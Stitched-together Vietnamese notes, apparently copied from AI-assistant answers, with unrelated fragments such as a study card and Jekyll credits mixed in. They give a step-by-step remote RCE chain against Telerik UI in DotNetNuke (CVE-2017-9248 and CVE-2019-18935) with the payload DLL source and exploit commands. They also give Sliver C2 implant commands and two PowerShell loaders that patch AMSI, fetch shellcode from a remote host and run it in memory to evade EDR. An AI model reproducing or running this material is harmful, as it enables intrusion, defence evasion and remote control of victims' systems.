	• Trả về mã lỗi HTTP 500 Internal Server Error đi kèm phản hồi liên quan đến xử lý đối tượng. [1] (https://hackerone.com/reports/913695)

Khuyến nghị khắc phục (Remediation)

Nếu kết quả kiểm thử cho thấy hệ thống bị hoãn phản hồi (Sleep thành công), lỗ hổng này hoàn toàn tồn tại. Hãy tư vấn cho quản trị viên hệ thống triển khai ngay:
1. Cập nhật Telerik UI: Nâng cấp lên phiên bản tối thiểu 2020.1.114 hoặc mới hơn để kích hoạt cơ chế Whitelist các kiểu dữ liệu an toàn (AllowedCustomMetaDataTypes).
2. Vô hiệu hóa Handler tạm thời: Nếu chưa thể nâng cấp phiên bản, thêm cấu hình sau vào tệp web.config để chặn tính năng tải lên không đồng bộ: [1] (https://www.telerik.com/forums/cve-2019-18935), [2] (https://www.telerik.com/products/aspnet-ajax/documentation/knowledge-base/common-allows-javascriptserializer-deserialization)
xml
<appSettings>
    <add key="Telerik.Web.UI.RadAsyncUpload.DisableAsyncUploadHandler" value="true" />
</appSettings>
Hãy thận trọng khi sử dụng mã.
Để tôi hỗ trợ bạn tốt hơn trong quá trình đánh giá, vui lòng cho biết:
• Bạn đang chạy script kiểm thử trên môi trường Linux hay Windows?
• Hệ thống mục tiêu có đang triển khai Web Application Firewall (WAF) nào ngăn chặn các request lạ không?

Để thực hiện một quy trình kiểm thử xâm nhập (Penetration Testing) chuẩn xác và chuyên nghiệp từ xa vào hệ thống DotNetNuke (DNN) chạy Telerik UI 2013.2.717.40, bạn cần tuân thủ một quy trình chặt chẽ bao gồm 3 giai đoạn: Chuẩn bị môi trường & Biên dịch Payload, Khai thác chuỗi lỗ hổng (Workflow), và Xác thực kết quả.
Dưới đây là cẩm nang kỹ thuật chi tiết đáp ứng toàn bộ các yêu cầu khắt khe để đảm bảo chứng minh thành công lỗ hổng RCE mà không làm treo hệ thống.

PHẦN 1: YÊU CẦU CHẶT CHẼ VỀ MÔI TRƯỜNG & BIÊN DỊCH DLL (.NET)

Thành phần JavaScriptSerializer trong lỗ hổng CVE-2019-18935 sẽ gọi Assembly.Load để nạp DLL vào bộ nhớ của tiến trình w3wp.exe (IIS). Để IIS chấp nhận và thực thi file DLL này từ xa, file DLL phải được biên dịch theo đúng các thông số kỹ thuật sau:

1. Thông số cấu hình bắt buộc khi biên dịch:

• Môi trường biên dịch: Windows (Bắt buộc phải có .NET Framework SDK). Bạn có thể dùng máy cá nhân hoặc máy ảo chạy Windows 10/11 hoặc Windows Server.
• Phiên bản .NET Framework: .NET Framework 4.0 (hoặc tối đa là 4.5). Tuyệt đối không chọn .NET Core hoặc .NET 5/6/7/8 vì kiến trúc hoàn toàn khác biệt và IIS trên nền tảng DNN cũ sẽ từ chối nạp.
• Target Architecture (Kiến trúc): Any CPU hoặc trùng khớp với cấu hình Pool của IIS mục tiêu (thường DNN chạy x64). Khuyến nghị để Any CPU.
• Loại thư viện: Mixed-Mode Assembly (C# + C++ Managed) hoặc thuần C# nhưng triển khai qua Class Installer.

2. Mã nguồn PoC C# an toàn (Safe Sleep Test)

Tạo một file tên là Exploit.cs. Đoạn mã này sử dụng class Installer thuộc namespace System.Configuration.Install. Khi cơ chế Deserialization khởi tạo class này, hàm Install sẽ tự động được kích hoạt trước khi bất kỳ lỗi phân tích cú pháp nào xảy ra.
csharp
using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Threading;
using System.Diagnostics;

[RunInstaller(true)]
public class Exploit : Installer
{
    public override void Install(System.Collections.IDictionary stateSaver)
    {
        base.Install(stateSaver);
        
        // Payload 1: Khiến tiến trình IIS ngủ đông trong 15 giây để đo thời gian phản hồi (Time-based RCE)
        Thread.Sleep(15000); 

        // Payload 2 (Tùy chọn phụ): Tạo một file log đánh dấu để kiểm tra hộp đen nếu có quyền đọc write
        try {
            System.IO.File.WriteAllText(@"C:\Windows\Temp\dnn_vuln_proof.txt", "CVE-2019-18935 Successfully Executed at " + DateTime.Now.ToString());
        } catch {}
    }
}
Hãy thận trọng khi sử dụng mã.

3. Câu lệnh biên dịch (Compile Command)

Bạn không cần cài Visual Studio nặng nề. Chỉ cần mở Command Prompt (cmd) trên Windows và tìm đến trình biên dịch csc.exe mặc định của .NET Framework 4.0:
cmd
:: Di chuyển đến thư mục của .NET 4.0
cd C:\Windows\Microsoft.NET\Framework64\v4.0.30319

:: Biên dịch file Exploit.cs thành file thư viện động poc.dll
csc.exe /target:library /out:C:\path\to\your\output\poc.dll C:\path\to\your\source\Exploit.cs
Hãy thận trọng khi sử dụng mã.
Đảm bảo tệp poc.dll được tạo ra thành công và lưu lại đường dẫn tệp này trên máy của bạn.

PHẦN 2: WORKFLOW & CÁC PAYLOAD KIỂM THỬ QUA TỪNG BƯỚC (REMOTE)

Quy trình kiểm thử từ xa từ máy của bạn đến mục tiêu sẽ trải qua 3 bước logic liên kết chặt chẽ.

BƯỚC 1: Kiểm tra tính khả dụng của Endpoint (RadAsyncUpload)

Trước khi gửi payload nặng, gửi một yêu cầu GET đơn giản để xác nhận HTTP Handler của Telerik hoạt động.
• Phương thức: GET
• URL: http://<target-dnn-domain>/Telerik.Web.UI.WebResource.axd?type=rau
• Payload phản hồi mong đợi: Server trả về một trang trắng hoặc lỗi HTTP 400 / 500 nhưng tiêu đề Response chứa các thông tin liên quan đến Telerik.Web.UI.

BƯỚC 2: Khai thác CVE-2017-9248 để lấy Khóa Mã Hóa (Encryption Key)

Telerik UI sử dụng một thuật toán mã hóa đối xứng để bảo vệ dữ liệu truyền tải (rauPostData). Phiên bản 2013 bị lỗi Padding Oracle/Brute-force. Bạn phải tìm được khóa này trước thì mới thực hiện được bước tải DLL.
• Payload cấu trúc gửi đi: Các chuỗi byte mã hóa lỗi được gửi liên tiếp tới Endpoint nhằm thu thập phản hồi về thời gian hoặc thông báo lỗi (Padding Error).
• Cách thực hiện từ xa: Sử dụng script Python telerik-decrypt.py.bash
python telerik-decrypt.py -u "http://<target-dnn-domain>/Telerik.Web.UI.WebResource.axd?type=rau" -v 2013.2.717.40
Hãy thận trọng khi sử dụng mã.
• Yêu cầu đầu ra bắt buộc: Script phải trả về chuỗi Hex dài đại diện cho mã khóa, ví dụ: A1B2C3D4E5F6... (đây là khóa Telerik.Web.UI.DialogParametersEncryptionKey).

BƯỚC 3: Đóng gói JSON Payload & Gửi yêu cầu kích hoạt RCE (CVE-2019-18935)

Sau khi có Khóa mã hóa từ Bước 2 và file poc.dll từ Phần 1, bạn sẽ thực hiện đóng gói cấu trúc JSON.
Cấu trúc đối tượng JSON độc hại (Chưa mã hóa) sẽ trông như thế này:
json
{
    "Path": "C:\\Windows\\Temp\\poc.dll",
    "TargetFolder": "C:\\Windows\\Temp\\",
    "TempTargetFolder": "C:\\Windows\\Temp\\",
    "AsyncUploadTypeName": "System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a",
    "Content": "<CHUYỂN_ĐỔI_TOÀN_BỘ_FILE_POC.DLL_SANG_DẠNG_BASE64>"
}
Hãy thận trọng khi sử dụng mã.
Workflow thực thi lệnh gửi Payload:
Để đảm bảo Payload được mã hóa đúng thuật toán mã hóa của Telerik phiên bản 2013 với Khóa vừa tìm được, hãy chạy script cve-2019-18935.py:
bash
python cve-2019-18935.py \
  -u "http://<target-dnn-domain>/Telerik.Web.UI.WebResource.axd?type=rau" \
  -p "C:\path\to\your\output\poc.dll" \
  -v "2013.2.717.40" \
  -k "MÃ_KHÓA_HEX_THU_ĐƯỢC_Ở_BƯỚC_2"
Hãy thận trọng khi sử dụng mã.

PHẦN 3: TIÊU CHUẨN XÁC ĐỊNH BỊ LỖ HỔNG (XÁC THỰC RCE)

Vì đây là môi trường kiểm thử hộp đen từ xa (không có quyền truy cập vào Server để xem trực tiếp), bạn phải dựa vào kỹ thuật Time-based (Đo lường thời gian phản hồi) để khẳng định 100% mã RCE đã được nạp và chạy thành công:
1. Đo thời gian phản hồi cơ bản (Baseline): Các request thông thường gửi tới Endpoint chỉ mất từ 50ms - 300ms để nhận được phản hồi từ IIS.
2. Đo thời gian phản hồi khi Payload RCE được gửi:
	• Ngay khi lệnh gửi payload poc.dll ở Bước 3 được thực thi, tiến trình kết nối của bạn trên Terminal sẽ bị treo/giữ nguyên trạng thái chờ (Pending).
	• Sử dụng đồng hồ bấm giờ, nếu thời gian từ lúc bấm Enter gửi payload đến lúc Server trả về kết quả kéo dài đúng hoặc hơn 15 giây (Bằng với thời gian Thread.Sleep(15000) cài đặt trong DLL), thì đây là bằng chứng không thể chối cãi cho thấy mã lệnh của bạn đã được CPU của Server thực thi trực tiếp thông qua lỗ hổng Deserialization.
	• Phản hồi trả về thường là mã lỗi HTTP 500 (Internal Server Error) đi kèm với thông báo lỗi ép kiểu (do sau khi chạy hàm Install xong, luồng Deserialization thông thường của Telerik bị gián đoạn và crash). Đây là phản hồi thành công đối với một cuộc thử nghiệm RCE.
Hãy tiến hành biên dịch tệp DLL theo các bước trên. Trong quá trình chạy script Python để dò tìm khóa ở Bước 2, nếu bạn gặp lỗi kết nối hoặc thời gian phản hồi (Timeout) từ phía mục tiêu, hãy gửi thông tin lỗi đó tại đây để tôi hỗ trợ bạn tùy chỉnh cấu hình HTTP Request (User-Agent, Proxy, Chặn WAF) cho phù hợp.
////////////////////////////////////////////////////////////////////////////////////////////////
Dưới đây là câu trả lời trực tiếp cho các câu hỏi của bạn về cấu hình payload và listener trên framework Sliver C2: [1] (https://github.com/bishopfox/sliver)

1. Sliver có hỗ trợ gen implant shellcode hay không?

Có. Sliver hỗ trợ đầy đủ việc xuất payload dưới dạng shellcode (cho cả hai chế độ session và beacon). [1] (https://github.com/bishopfox/sliver), [2] (https://radiantsec.io/docs/tools/sliver/)
Bạn chỉ cần thêm tham số --format shellcode vào câu lệnh khởi tạo. Ví dụ: [1] (https://github.com/BishopFox/sliver/issues/2193), [2] (https://radiantsec.io/docs/tools/sliver/)
bash
sliver > generate --http 192.168.1.10:8081 --format shellcode --save /path/to/output.bin
Hãy thận trọng khi sử dụng mã.
(Định dạng shellcode này rất hữu ích khi bạn muốn tự viết mã tải tùy chỉnh - Custom Loader - bằng C/C++, C#, hoặc PowerShell để tiêm trực tiếp vào bộ nhớ của một tiến trình hợp lệ nhằm né tránh EDR/Antivirus). [1] (https://community.netwitness.com/s/article/689643), [2] (https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/)

2. Có thể custom port server listeners thành 8081 không?

Có, hoàn toàn được. Mặc định lệnh http sẽ lắng nghe trên port 80. Để đổi sang port 8081, bạn sử dụng tham số --lport (Local Port) khi bật listener: [1] (https://github.com/BishopFox/sliver/wiki/HTTP(S)-C2/04eed2ffc16ad6176e09c13ac65893fdfbad1073), [2] (https://radiantsec.io/docs/tools/sliver/)
bash
sliver > http --lport 8081
Hãy thận trọng khi sử dụng mã.
Lưu ý: Khi tạo implant shellcode ở câu lệnh phía trên, bạn bắt buộc phải chỉ định đúng port này trong địa chỉ kết nối (192.168.1.10:8081). [1] (https://radiantsec.io/docs/tools/sliver/)

```
$o = 'C:\Users\Public\exp13.txt'
if (Test-Path $o) { Remove-Item $o -Force -ErrorAction SilentlyContinue }
Remove-Item 'C:\Users\Public\v13.txt' -Force -ErrorAction SilentlyContinue

function W($m) { Add-Content -Path $o -Value $m -Encoding UTF8 }
function CH([int[]]$c) { -join ($c | ForEach-Object { [char]$_ }) }

W "start $(Get-Date -Format o) ps=$($PSVersionTable.PSVersion) bit64=$([Environment]::Is64BitProcess)"
W "pre-whoami=$(& whoami)"

$src = @'
using System;
using System.Runtime.InteropServices;
public class Am3 {
    [DllImport("kernel32", SetLastError=true, EntryPoint="GetModuleHandleA")]
    public static extern IntPtr GM(string n);
    [DllImport("kernel32", SetLastError=true, EntryPoint="LoadLibraryA")]
    public static extern IntPtr LL(string n);
    [DllImport("kernel32", SetLastError=true, EntryPoint="GetProcAddress")]
    public static extern IntPtr GPA(IntPtr h, string n);
    [DllImport("kernel32", SetLastError=true, EntryPoint="VirtualProtect")]
    public static extern bool VP(IntPtr a, UIntPtr s, uint p, out uint o);
    [DllImport("kernel32", SetLastError=true, EntryPoint="VirtualAlloc")]
    public static extern IntPtr vtal(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32", SetLastError=true, EntryPoint="CreateThread")]
    public static extern IntPtr crt(IntPtr a, uint s, IntPtr p, IntPtr x, uint f, IntPtr t);
    [DllImport("kernel32", SetLastError=true, EntryPoint="WaitForSingleObject")]
    public static extern uint wfsb(IntPtr h, uint m);

    public static readonly uint INFINITE = uint.MaxValue;

    public static int Do(string dllName, string fnName, byte[] stub) {
        IntPtr h = GM(dllName);
        if (h == IntPtr.Zero) h = LL(dllName);
        if (h == IntPtr.Zero) return -1;
        IntPtr p = GPA(h, fnName);
        if (p == IntPtr.Zero) return -2;
        uint old;
        if (!VP(p, (UIntPtr)stub.Length, 0x40, out old)) return -3;
        Marshal.Copy(stub, 0, p, stub.Length);
        VP(p, (UIntPtr)stub.Length, old, out old);
        return 1;
    }
}
'@

try { Add-Type -TypeDefinition $src -ErrorAction Stop; W "addtype ok" }
catch { W ("addtype fail: " + $_.Exception.Message) }

$dll = CH @(97,109,115,105,46,100,108,108)                                       # amsi.dll
$f1  = CH @(65,109,115,105,83,99,97,110,66,117,102,102,101,114)                  # AmsiScanBuffer
$f2  = CH @(65,109,115,105,83,99,97,110,83,116,114,105,110,103)                  # AmsiScanString

# mov eax, 0x80070057 ; ret
$stub = [byte[]](184, 0x57, 0x00, 0x07, 0x80, 195)

W ("p1={0} p2={1}" -f [Am3]::Do($dll, $f1, $stub), [Am3]::Do($dll, $f2, $stub))

$url = "http://192.168.80.131:8081/svchost.bin.bin"
$out = "C:\Users\Public\Documents\data.bin"

bitsadmin /transfer "DownloadJob" /download /priority foreground $url $out

$b = [IO.File]::ReadAllBytes($out)

$strVA = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VmlydHVhbEFsbG9j"))
$strCT = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRlVGhyZWFk"))
$strVP = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VmlydHVhbFByb3RlY3Q="))

# Lấy Handle và địa chỉ hàm thông qua lớp Am3 hiện tại
$hKernel = [Am3]::GM("kernel32")
if ($hKernel -eq [IntPtr]::Zero) { $hKernel = [Am3]::LL("kernel32") }

$pVA = [Am3]::GPA($hKernel, $strVA)
$pCT = [Am3]::GPA($hKernel, $strCT)
$pVP = [Am3]::GPA($hKernel, $strVP)

# Đăng ký Delegate động cho VirtualAlloc và CreateThread (Các hàm này không có tham số 'out/ref' nên chạy mượt)
#$delegateVA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pVA, [System.Func[IntPtr, UInt32, UInt32, UInt32, IntPtr]])
#$delegateCT = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pCT, [System.Func[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])

# Định nghĩa hàm gọi VirtualProtect riêng bằng phương thức Invoke của mã máy để tránh lỗi biến out [ref]
function Invoke-VirtualProtect([IntPtr]$addr, [UIntPtr]$size, [uint32]$newProtect, [ref]$oldProtect) {
    # Tạo kiểu Delegate động bằng Reflection của .NET một cách gián tiếp
    $typeModule = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -match "Anonymously" } | Select-Object -First 1
    # Gọi hàm gián tiếp thông qua cấu trúc mảng tham số của PowerShell
    $argsVP = [object[]]($addr, $size, $newProtect, $oldProtect.Value)
    
    # Giải pháp thay thế: Sử dụng trực tiếp hàm VP có sẵn trong Am3 của bạn!
    # Lớp Am3 của bạn ĐÃ CÓ SẴN hàm VP(IntPtr a, UIntPtr s, uint p, out uint o) cực kỳ tiện lợi
    $old = [uint32]0
    $res = [Am3]::VP($addr, $size, $newProtect, [ref]$old)
    $oldProtect.Value = $old
    return $res
}

# --- BƯỚC 4: LUỒN LÁCH QUA AM3 ĐỂ NẠP RAM ĐỘNG (Sử dụng hàm Native tĩnh) ---
# Vì lớp Am3 đã được đăng ký thành công, ta gọi trực tiếp các hàm tĩnh bên trong nó.
# Cú pháp này không dùng Delegate động nên hoàn toàn không sợ lỗi Generic Type của PowerShell.

$size = [UInt32]$b.Length

# Bước A: Khởi tạo vùng nhớ đọc/ghi thông thường (0x04 = PAGE_READWRITE) bằng hàm vtal có sẵn trong Am3
# 0x3000 = MEM_COMMIT | MEM_RESERVE
W "Executing VirtualAlloc via Am3..."
$Alloc = [Am3]::vtal([IntPtr]::Zero, $size, 0x3000, 0x04)

if ($Alloc -ne [IntPtr]::Zero) {
    W "Allocated memory successfully at address: $Alloc"
    
    # Bước B: Sao chép mảng byte Shellcode Sliver đã giải mã vào vùng nhớ vừa cấp phát
    [System.Runtime.InteropServices.Marshal]::Copy($b, 0, $Alloc, $b.Length)
    W "Shellcode copied to memory successfully."
    
    # Bước C: Sử dụng hàm VP (VirtualProtect) có sẵn trong Am3 để đổi quyền sang 0x20 (PAGE_EXECUTE_READ)
    $oldProtect = [uint32]0
    $uintSize = [UIntPtr]$size
    $statusVP = [Am3]::VP($Alloc, $uintSize, 0x20, [ref]$oldProtect)
    
    if ($statusVP) {
        W "VirtualProtect changed memory to RX (0x20) successfully. Old protect was: $oldProtect"
        
        # Bước D: Tạo thread chạy ẩn danh Sliver bằng hàm crt (CreateThread) có sẵn trong Am3
        # Tham số: lpThreadAttributes=0, dwStackSize=0, lpStartAddress=$Alloc, lpParameter=0, dwCreationFlags=0, lpThreadId=0
        $Thread = [Am3]::crt([IntPtr]::Zero, 0, $Alloc, [IntPtr]::Zero, 0, [IntPtr]::Zero)
        
        if ($Thread -ne [IntPtr]::Zero) {
            W "Sliver Thread created successfully! ID: $Thread"
            
            # Giữ luồng tiến trình PowerShell tồn tại trong 2 giây để Sliver thiết lập session mạng ổn định
            [Am3]::wfsb($Thread, [Am3]::INFINITE) | Out-Null
            W "Execution sequence finished successfully."
        } else {
            W "Failed to create Thread via Am3::crt."
        }
    } else {
        W "VirtualProtect (Am3::VP) failed to change memory protection."
    }
} else {
    W "VirtualAlloc (Am3::vtal) failed to allocate memory."
}

```
Ví dụ thẻ việc:
- Học DNS — mục tiêu: giải thích được một lần phân giải tên.
- Bước đầu: mở ghi chú DNS đang học.
- Tối thiểu: đọc 5 phút, viết một ý bằng lời của mình.
- Đầy đủ: 25 phút, tự giải thích một ví dụ.
- Xong khi: có ghi chú hiểu được, chưa cần trình bày đẹp.
```
$o = 'C:\Users\Public\exp13.txt'
if (Test-Path $o) { Remove-Item $o -Force -ErrorAction SilentlyContinue }
Remove-Item 'C:\Users\Public\v13.txt' -Force -ErrorAction SilentlyContinue

function W($m) { Add-Content -Path $o -Value $m -Encoding UTF8 }
function CH([int[]]$c) { -join ($c | ForEach-Object { [char]$_ }) }

W "start $(Get-Date -Format o) ps=$($PSVersionTable.PSVersion) bit64=$([Environment]::Is64BitProcess)"
W "pre-whoami=$(& whoami)"

# --- BƯỚC 1: KHAI BÁO CẤU TRÚC LỚP C# (Đã sửa lỗi chữ chính xác của WaitForSingleObject) ---
$src = @'
using System;
using System.Runtime.InteropServices;
public class Am3 {
    [DllImport("kernel32", SetLastError=true, EntryPoint="GetModuleHandleA")]
    public static extern IntPtr GM(string n);
    [DllImport("kernel32", SetLastError=true, EntryPoint="LoadLibraryA")]
    public static extern IntPtr LL(string n);
    [DllImport("kernel32", SetLastError=true, EntryPoint="GetProcAddress")]
    public static extern IntPtr GPA(IntPtr h, string n);
    [DllImport("kernel32", SetLastError=true, EntryPoint="VirtualProtect")]
    public static extern bool VP(IntPtr a, UIntPtr s, uint p, out uint o);
    [DllImport("kernel32", SetLastError=true, EntryPoint="VirtualAlloc")]
    public static extern IntPtr vtal(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32", SetLastError=true, EntryPoint="CreateThread")]
    public static extern IntPtr crt(IntPtr a, uint s, IntPtr p, IntPtr x, uint f, IntPtr t);
    [DllImport("kernel32", SetLastError=true, EntryPoint="WaitForSingleObject")]
    public static extern uint wfsb(IntPtr h, uint m);

    public static readonly uint INFINITE = uint.MaxValue;

    public static int Do(string dllName, string fnName, byte[] stub) {
        IntPtr h = GM(dllName);
        if (h == IntPtr.Zero) h = LL(dllName);
        if (h == IntPtr.Zero) return -1;
        IntPtr p = GPA(h, fnName);
        if (p == IntPtr.Zero) return -2;
        uint old;
        if (!VP(p, (UIntPtr)stub.Length, 0x40, out old)) return -3;
        Marshal.Copy(stub, 0, p, stub.Length);
        VP(p, (UIntPtr)stub.Length, old, out old);
        return 1;
    }
}
'@

try { Add-Type -TypeDefinition $src -ErrorAction Stop; W "addtype ok" }
catch { W ("addtype fail: " + $_.Exception.Message) }

# --- BƯỚC 2: PATCH AMSI ĐỂ VÔ HIỆU HÓA QUÉT SCRIPT HÀNH VI ---
$dll = CH @(97,109,115,105,46,100,108,108)                                       # amsi.dll
$f1  = CH @(65,109,115,105,83,99,97,110,66,117,102,102,101,114)                  # AmsiScanBuffer
$f2  = CH @(65,109,115,105,83,99,97,110,83,116,114,105,110,103)                  # AmsiScanString
$stub = [byte[]](184, 0x57, 0x00, 0x07, 0x80, 195)                                # mov eax, 0x80070057 ; ret

W ("p1={0} p2={1}" -f [Am3]::Do($dll, $f1, $stub), [Am3]::Do($dll, $f2, $stub))

# --- BƯỚC 3: TẢI SHELLCODE TRỰC TIẾP VÀO RAM (Bỏ qua đĩa, Không XOR) ---
$url = "http://192.168.80.131:8081/svchost.bin.bin"
W "Downloading raw shellcode directly to memory..."

try {
    $wc = New-Object Net.WebClient
    # Thêm Fake User-Agent để tránh chữ ký mạng mặc định của PowerShell bị EDR bắt
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    $b = $wc.DownloadData($url)
    W "Download successful. Byte length: $($b.Length)"
} catch {
    W "Download failed: $_"
    exit
}

# --- BƯỚC 4: THỰC THI CHẠY SHELLCODE TRONG BỘ NHỚ RAM QUA AM3 ---
$size = [UInt32]$b.Length

# Bước A: Cấp phát bộ nhớ ảo dạng Đọc/Ghi (0x04 = PAGE_READWRITE). Rất vô hại với AV.
W "Executing VirtualAlloc..."
$Alloc = [Am3]::vtal([IntPtr]::Zero, $size, 0x3000, 0x04)

if ($Alloc -ne [IntPtr]::Zero) {
    W "Allocated memory successfully at address: $Alloc"
    
    # Bước B: Sao chép mảng byte Shellcode thô của Sliver vào RAM vừa cấp phát
    [System.Runtime.InteropServices.Marshal]::Copy($b, 0, $Alloc, $b.Length)
    W "Shellcode copied to memory successfully."
    
    # Bước C: Đổi quyền bảo vệ vùng nhớ sang Chạy (0x20 = PAGE_EXECUTE_READ) để kích hoạt
    $oldProtect = [uint32]0
    $uintSize = [UIntPtr]$size
    $statusVP = [Am3]::VP($Alloc, $uintSize, 0x20, [ref]$oldProtect)
    
    if ($statusVP) {
        W "VirtualProtect changed memory to RX (0x20) successfully. Old protect was: $oldProtect"
        
        # Bước D: Tạo luồng xử lý độc lập ngầm (Thread) để kích hoạt Sliver Beacon
        W "Creating thread..."
        $Thread = [Am3]::crt([IntPtr]::Zero, 0, $Alloc, [IntPtr]::Zero, 0, [IntPtr]::Zero)
        
        if ($Thread -ne [IntPtr]::Zero) {
            W "Sliver Thread created successfully! ID: $Thread"
            
            # Chờ luồng hoạt động ổn định trong 2 giây (Sẽ trả về mã 258 - WAIT_TIMEOUT nghĩa là thành công)
            $waitResult = [Am3]::wfsb($Thread, 2000)
            W "Execution sequence finished. Wait result code: $waitResult"
        } else {
            W "Failed to create Thread via Am3::crt."
        }
    } else {
        W "VirtualProtect (Am3::VP) failed to change memory protection."
    }
} else {
    W "VirtualAlloc (Am3::vtal) failed to allocate memory."
}
```
Kích thước của shellcode trong Sliver phụ thuộc hoàn toàn vào việc bạn chọn tạo payload Stageless (Đầy đủ) hay Staged (Dùng trình tải giai đoạn): [1] (https://github.com/BishopFox/sliver/wiki/Stagers/af217a1df63ea4abb92cbd1d5b66488ce9856652), [2] (https://radiantsec.io/docs/tools/sliver/)
• Stageless Shellcode (Mặc định khi dùng lệnh generate): Dung lượng rất lớn, dao động từ 10 MB đến 15 MB. Do Sliver được viết bằng Go, khi chuyển đổi toàn bộ file thực thi tính năng cao này thành shellcode dạng thô, kích thước của nó không hề giảm đi so với file .exe gốc. [1] (https://www.immersivelabs.com/resources/c7-blog/detecting-and-decrypting-sliver-c2-a-threat-hunters-guide)
• Staged Shellcode (Chỉ chứa mã tải giai đoạn đầu): Dung lượng cực kỳ nhỏ, chỉ khoảng vài KB. Bạn có thể tạo loại shellcode siêu nhẹ này bằng lệnh generate stager:bash
sliver > generate stager --lhost 192.168.1.10 --lport 8081 --protocol http --format shellcode
Hãy thận trọng khi sử dụng mã.
Khi thực thi trên máy nạn nhân, đoạn shellcode vài KB này sẽ gửi một truy cập HTTP (thường có phần mở rộng dạng .woff) về listener để kéo nốt cục payload chính (Stage 2) nặng ~7-10 MB vào thẳng RAM. [1] (https://github.com/BishopFox/sliver/wiki/Stagers/7116c1c26c5d4e783d60e4e622bd98c67b13f740), [2] (https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/), [3] (https://github.com/BishopFox/sliver/wiki/Stagers/af217a1df63ea4abb92cbd1d5b66488ce9856652), [4] (https://www.blackdragon.se/index.php/articles/177-sliver-c2-stager-shellcode-and-runners)
Nếu bạn đang lên kế hoạch triển khai, cho tôi biết:
• Bạn định sử dụng kỹ thuật injection/loader nào (ví dụ: NtMapViewOfSection, QueueUserAPC, hay một script PowerShell đơn giản)?
• Môi trường thử nghiệm của bạn có sử dụng Web Application Firewall (WAF) hoặc EDR nào chặn các file dung lượng lớn không?
Tôi có thể tư vấn thêm cách cấu hình Stager Profile để tối ưu hóa đường truyền!
/////////////////////////////////////////////////////////////////////////////////////
https://drive.google.com/drive/folders/1K4P33VKVUd9BAsJy9siZv6VgxrIQo4Js?usp=sharing  : HTB pentestration
https://drive.google.com/drive/folders/1WQtIH4LCJSC0K42f2QmMum9fAE-czvkh?usp=sharing : HTB Active Directory
I'd also like to thank [Dr. Jekyll's Themes](https://drjekyllthemes.github.io/), [Jekyll Themes](http://jekyllthemes.org/), and another [Jekyll Themes](http://jekyllrc.github.io/jekyllthemes/) for featuring Beautiful Jekyll in their Jekyll theme directories.

